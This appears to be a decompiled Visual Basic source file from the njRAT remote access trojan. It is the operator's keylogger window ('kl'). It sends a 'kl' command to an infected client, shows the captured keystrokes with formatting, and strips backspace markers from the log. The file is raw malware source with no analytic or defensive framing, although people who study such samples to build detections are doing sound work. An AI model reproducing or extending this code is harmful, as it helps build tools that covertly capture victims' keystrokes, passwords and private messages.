Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200001B RID: 27
	<DesignerGenerated()>
	Public Partial Class kl
		Inherits Form

		' Token: 0x17000074 RID: 116
		' (get) Token: 0x06000176 RID: 374 RVA: 0x0000F8C3 File Offset: 0x0000DAC3
		' (set) Token: 0x06000177 RID: 375 RVA: 0x0000F8CD File Offset: 0x0000DACD
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x17000075 RID: 117
		' (get) Token: 0x06000178 RID: 376 RVA: 0x0000F8D6 File Offset: 0x0000DAD6
		' (set) Token: 0x06000179 RID: 377 RVA: 0x0000F8E0 File Offset: 0x0000DAE0
		Friend Overridable Property MenuStrip1 As MenuStrip

		' Token: 0x17000076 RID: 118
		' (get) Token: 0x0600017A RID: 378 RVA: 0x0000F8E9 File Offset: 0x0000DAE9
		' (set) Token: 0x0600017B RID: 379 RVA: 0x0000F8F4 File Offset: 0x0000DAF4
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000077 RID: 119
		' (get) Token: 0x0600017C RID: 380 RVA: 0x0000F937 File Offset: 0x0000DB37
		' (set) Token: 0x0600017D RID: 381 RVA: 0x0000F944 File Offset: 0x0000DB44
		Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem2_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem2
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem2 = value
				toolStripMenuItem = Me._ToolStripMenuItem2
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000078 RID: 120
		' (get) Token: 0x0600017E RID: 382 RVA: 0x0000F987 File Offset: 0x0000DB87
		' (set) Token: 0x0600017F RID: 383 RVA: 0x0000F991 File Offset: 0x0000DB91
		Friend Overridable Property TFind As ToolStripTextBox

		' Token: 0x17000079 RID: 121
		' (get) Token: 0x06000180 RID: 384 RVA: 0x0000F99A File Offset: 0x0000DB9A
		' (set) Token: 0x06000181 RID: 385 RVA: 0x0000F9A4 File Offset: 0x0000DBA4
		Friend Overridable Property ToolStripMenuItem3 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem3_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem3 = value
				toolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700007A RID: 122
		' (get) Token: 0x06000182 RID: 386 RVA: 0x0000F9E7 File Offset: 0x0000DBE7
		' (set) Token: 0x06000183 RID: 387 RVA: 0x0000F9F1 File Offset: 0x0000DBF1
		Friend Overridable Property T1 As RichTextBox

		' Token: 0x1700007B RID: 123
		' (get) Token: 0x06000184 RID: 388 RVA: 0x0000F9FA File Offset: 0x0000DBFA
		' (set) Token: 0x06000185 RID: 389 RVA: 0x0000FA04 File Offset: 0x0000DC04
		Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x1700007C RID: 124
		' (get) Token: 0x06000186 RID: 390 RVA: 0x0000FA0D File Offset: 0x0000DC0D
		' (set) Token: 0x06000187 RID: 391 RVA: 0x0000FA18 File Offset: 0x0000DC18
		Friend Overridable Property CopyToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyToolStripMenuItem_Click
				Dim copyToolStripMenuItem As ToolStripMenuItem = Me._CopyToolStripMenuItem
				If copyToolStripMenuItem IsNot Nothing Then
					RemoveHandler copyToolStripMenuItem.Click, value2
				End If
				Me._CopyToolStripMenuItem = value
				copyToolStripMenuItem = Me._CopyToolStripMenuItem
				If copyToolStripMenuItem IsNot Nothing Then
					AddHandler copyToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700007D RID: 125
		' (get) Token: 0x06000188 RID: 392 RVA: 0x0000FA5B File Offset: 0x0000DC5B
		' (set) Token: 0x06000189 RID: 393 RVA: 0x0000FA68 File Offset: 0x0000DC68
		Friend Overridable Property SelectAllToolStripMenuItem As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._SelectAllToolStripMenuItem
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SelectAllToolStripMenuItem_Click
				Dim selectAllToolStripMenuItem As ToolStripMenuItem = Me._SelectAllToolStripMenuItem
				If selectAllToolStripMenuItem IsNot Nothing Then
					RemoveHandler selectAllToolStripMenuItem.Click, value2
				End If
				Me._SelectAllToolStripMenuItem = value
				selectAllToolStripMenuItem = Me._SelectAllToolStripMenuItem
				If selectAllToolStripMenuItem IsNot Nothing Then
					AddHandler selectAllToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x0600018A RID: 394 RVA: 0x0000FAAB File Offset: 0x0000DCAB
		Public Sub New()
			Me.listViewItem_0 = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600018B RID: 395 RVA: 0x0000FAC4 File Offset: 0x0000DCC4
		Public Sub insert(T As String)
			Dim flag As Boolean = T.StartsWith(ChrW(1)) And T.EndsWith(ChrW(1))
			If flag Then
				Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
				Me.T1.SelectionColor = Color.SteelBlue
				Me.T1.AppendText(vbCrLf & "[ " + T.Replace(ChrW(1), String.Empty) + "]" & vbCrLf)
			Else
				Me.T1.SelectionFont = Me.T1.Font
				Me.T1.SelectionColor = Me.T1.ForeColor
				Me.T1.AppendText(T + vbCrLf)
			End If
		End Sub

		' Token: 0x0600018C RID: 396 RVA: 0x0000FB90 File Offset: 0x0000DD90
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.Copy()
		End Sub

		' Token: 0x0600018D RID: 397 RVA: 0x0000FBA0 File Offset: 0x0000DDA0
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				Me.c.Send("kl")
				Me.ToolStripMenuItem1.Enabled = False
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600018E RID: 398 RVA: 0x0000FBF0 File Offset: 0x0000DDF0
		Private Sub SelectAllToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.T1.SelectAll()
		End Sub

		' Token: 0x0600018F RID: 399 RVA: 0x0000FC00 File Offset: 0x0000DE00
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.T1.Find(Me.TFind.Text, Me.T1.SelectionStart + Me.T1.SelectionLength, RichTextBoxFinds.None) = -1
			If flag Then
				Me.T1.Find(Me.TFind.Text, 0, RichTextBoxFinds.None)
			End If
		End Sub

		' Token: 0x06000190 RID: 400 RVA: 0x0000FC60 File Offset: 0x0000DE60
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Try
				Dim num As Integer = 1
				Dim dataObject As IDataObject = Clipboard.GetDataObject()
				Me.T1.[ReadOnly] = False
				While num <> -1
					num = Me.T1.Find("[Back]", num, RichTextBoxFinds.None)
					Dim flag As Boolean = num > 0
					If flag Then
						Dim left As String = Me.T1.Text(num - 1).ToString()
						If Operators.CompareString(left, "]", False) <> 0 AndAlso Operators.CompareString(left, vbLf, False) <> 0 Then
							Me.T1.[Select](num - 1, "[back]".Length + 1)
							Me.T1.Cut()
						Else
							Me.T1.[Select](num, "[back]".Length)
							Me.T1.Cut()
						End If
					End If
				End While
				Clipboard.SetDataObject(dataObject)
				Me.T1.[ReadOnly] = True
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x040000F3 RID: 243
		Public c As Client

		' Token: 0x040000F4 RID: 244
		Private listViewItem_0 As ListViewItem
	End Class
End Namespace
